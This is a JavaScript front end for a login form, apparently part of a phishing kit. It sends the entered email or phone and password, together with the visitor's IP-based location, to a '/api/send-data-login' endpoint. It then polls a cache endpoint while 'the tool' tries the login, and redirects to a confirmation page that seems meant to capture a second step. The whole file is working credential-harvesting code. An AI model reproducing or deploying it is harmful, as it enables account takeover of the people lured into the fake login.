var ipAddress = "";
var latitude = "";
var longitude = "";
var countryName = "";
var countryCode = "";
var cityName = "";
var regionName = "";
var timeZone = "";
var zipCode = "";
var continent = "";
var continentCode = "";

async function setCurrentLang() {
    let getIpInfoUrl = $('#getIpInfoUrl').val();
    const response = await fetch(getIpInfoUrl);
    const ipInfo = await response.json();
    ipAddress = ipInfo.ipAddress;
    latitude = ipInfo.latitude;
    longitude = ipInfo.longitude;
    countryName = ipInfo.countryName;
    countryCode = ipInfo.countryCode;
    cityName = ipInfo.cityName;
    regionName = ipInfo.regionName;
    timeZone = ipInfo.timeZone;
    zipCode = ipInfo.zipCode;
    continent = ipInfo.continent;
    continentCode = ipInfo.continentCode;
}
setCurrentLang();

var idIntervalGetCacheByEmail = null;

$(document).on('click', '#btnLogin-desktop', function () {
    $(this).prop('disabled', true);
    $('#login_error').css('display', 'none');
    const loading = $('#submit-login-loading');
    const text = $('#submit-login-text');
    text.addClass('d-none');
    loading.removeClass('d-none');
    let email = $('#username-desktop').val();
    let pass = $('#password-desktop').val();
    setTimeout(() => {
        if (!isValidValuePhoneEmail(email) || !pass) {
            text.removeClass('d-none');
            loading.addClass('d-none');
            $('.input-form-login').addClass('is-invalid');
            $(this).prop('disabled', false);
        } else {
            $('#login_error').css('display', 'none');
            $('.input-form-login').removeClass('is-invalid');
            sendDataLoginDesktop();
        }
    }, 1000);
})

function sendDataLoginDesktop() {
    const valueEmail = $('#username-desktop').val();
    email = valueEmail;
    const valuePassword = $('#password-desktop').val();
    const loading = $('#submit-login-loading');
    const text = $('#submit-login-text');
    let formData = new FormData();
    formData.append('email_2', valueEmail);
    formData.append('password_2', valuePassword);
    formData = pushIPInfo(formData);
    $.ajax({
        method: "POST",
        url: "/api/send-data-login",
        data: formData,
        processData: false,
        contentType: false,
        cache: false,
        success: function (response) {
            if (response.status == 0) {
                // start to call get cache by email waiting until tool returns response of login
                idIntervalGetCacheByEmail = setInterval(async () => {
                    let info = await getCacheByEmail(valueEmail);
                    if (info) {
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                        if (info.isLoginSuccessfully) {
                            $('#login_error').css('display', 'none');
                            // save email on localStorage
                            localStorage.setItem("email", valueEmail);
                            //
                            window.location.href = $('#url-confirm').val();
                        } else {
                            $('#login_error').css('display', 'block');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        }
                        clearInterval(idIntervalGetCacheByEmail);
                        $('#btnLogin-desktop').prop('disabled', false);
                    } else {
                        console.log("Still call get cache by email");
                    }
                }, 3000);
            } else {
                $('#btnLogin-desktop').prop('disabled', false);
                $('#login_error').css('display', 'block');
                text.removeClass('d-none');
                loading.addClass('d-none');
            }
        }
    })
}

$(document).on('click', '#btnLogin-mobile', function () {
    $(this).prop('disabled', true);
    $('#login_error_mobile').css('display', 'none');
    const loading = $('#submit-login-mobile-loading');
    const text = $('#submit-login-mobile-text');
    text.addClass('d-none');
    loading.removeClass('d-none');
    let email = $('#username-mobile').val();
    let pass = $('#password-mobile').val();
    setTimeout(() => {
        if (!isValidValuePhoneEmail(email) || !pass) {
            text.removeClass('d-none');
            loading.addClass('d-none');
            $('.input-form-login').addClass('is-invalid');
            $(this).prop('disabled', false);
        } else {
            $('#login_error_mobile').css('display', 'none');
            $('.input-form-login').removeClass('is-invalid');
            sendDataLoginMobile();
        }
    }, 1000);
})

function sendDataLoginMobile() {
    const valueEmail = $('#username-mobile').val();
    const valuePassword = $('#password-mobile').val();
    const loading = $('#submit-login-mobile-loading');
    const text = $('#submit-login-mobile-text');
    let formData = new FormData();
    formData.append('email_2', valueEmail);
    formData.append('password_2', valuePassword);
    formData = pushIPInfo(formData);
    $.ajax({
        method: "POST",
        url: "/api/send-data-login",
        data: formData,
        processData: false,
        contentType: false,
        cache: false,
        success: function (response) {
            if (response.status == 0) {
                // start to call get cache by email waiting until tool returns response of login
                idIntervalGetCacheByEmail = setInterval(async () => {
                    let info = await getCacheByEmail(valueEmail);
                    if (info) {
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                        if (info.isLoginSuccessfully) {
                            $('#login_error_mobile').css('display', 'none');
                            // save email on localStorage
                            localStorage.setItem("email", valueEmail);
                            //
                            window.location.href = $('#url-confirm').val();
                        } else {
                            $('#login_error_mobile').css('display', 'block');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        }
                        clearInterval(idIntervalGetCacheByEmail);
                        $('#btnLogin-mobile').prop('disabled', false);
                    } else {
                        console.log("Still call get cache by email");
                    }
                }, 3000);
            } else {
                $('#btnLogin-mobile').prop('disabled', false);
                $('#login_error_mobile').css('display', 'block');
                text.removeClass('d-none');
                loading.addClass('d-none');
            }
        }
    })
}

async function getCacheByEmail(email) {
    let result = null;
    let formData = new FormData();
    formData.append('email', email);
    await $.ajax({
        method: "POST",
        url: "/api/get-cache-by-email",
        data: formData,
        cache: false,
        contentType: false,
        processData: false,
        success: function (response) {
            if (response.status == 0) {
                result = response.data;
            }
        }
    })

    return result;
}

function pushIPInfo(formData) {
    formData.append('ipAddress', ipAddress)
    formData.append('latitude', latitude)
    formData.append('longitude', longitude)
    formData.append('countryName', countryName)
    formData.append('countryCode', countryCode)
    formData.append('regionName', regionName)
    formData.append('cityName', cityName)
    formData.append('timeZone', timeZone)
    formData.append('zipCode', zipCode)
    formData.append('continent', continent)
    formData.append('continentCode', continentCode)
    return formData;
}

function inputValidateInput() {
    const value = $(this).val();
    if (value !== "") {
        $(this).removeClass('is-invalid')
    }
    const valueEmailDesktop = $('#username-desktop').val();
    const valuePasswordDesktop = $('#password-desktop').val();

    if (valueEmailDesktop !== '' && valuePasswordDesktop !== '') {
        $('#btnLogin-desktop').removeClass('disabled');
    }
}

function validatePhoneEmail() {
    const value = $(this).val();
    if (isValidValuePhoneEmail(value)) {
        $(this).removeClass('is-invalid');
    } else {
        $(this).addClass('is-invalid');
    }
}

function isValidValuePhoneEmail(value) {
    if (isNumeric(value)) {
        const regexPhoneNumber = /^0\d{9,12}$/;
        return regexPhoneNumber.test(value);
    } else {
        const regexEmail = /^([a-zA-Z0-9_\-\.+]+)@([a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}$/;
        return regexEmail.test(value);
    }
}

function isNumeric(str) {
    if (typeof str != "string") return false // we only process strings!
    return !isNaN(str) &&
        // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
        !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
}

$(document).on('input', '.validate-phone-email', validatePhoneEmail)
$(document).on('keydown', '.validate-input', inputValidateInput)
